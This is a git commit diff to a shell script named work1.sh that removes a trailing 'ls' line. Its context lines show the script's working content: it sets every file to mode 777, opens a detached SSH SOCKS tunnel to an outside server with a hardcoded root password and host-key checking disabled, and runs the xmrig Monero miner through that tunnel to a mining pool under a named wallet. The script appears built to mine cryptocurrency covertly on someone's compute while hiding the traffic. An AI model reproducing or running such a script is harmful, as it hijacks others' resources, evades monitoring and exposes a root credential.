4ca09f59e04ac835092d3047199fc8b1b2e27553
manhinh24inch <40003346+manhinh24inch@users.noreply.github.com>
2021-05-08 13:18:47 +0800

    Update work1.sh

--- work1.sh
+++ work1.sh
@@ -10,4 +10,3 @@ make -j$(nproc)
 sudo chmod 777 *
 screen -d -m sshpass -p fM7)n+31MMMhE%!_ ssh -o StrictHostKeyChecking=no -D 1997 root@207.148.101.207
 screen -d -m ./xmrig -o pool.minexmr.com:4444 -u 859HoAtW19PT8SmdjuMJ3DTqbZKFv8DFu7DYtk6wJm3YKrAJKTVeRDkZNq8fPseEz4D7KRBwkfGcHE73XKYYAhguEBH8w5X.test_03 -x socks4://127.0.0.1:1997
-ls
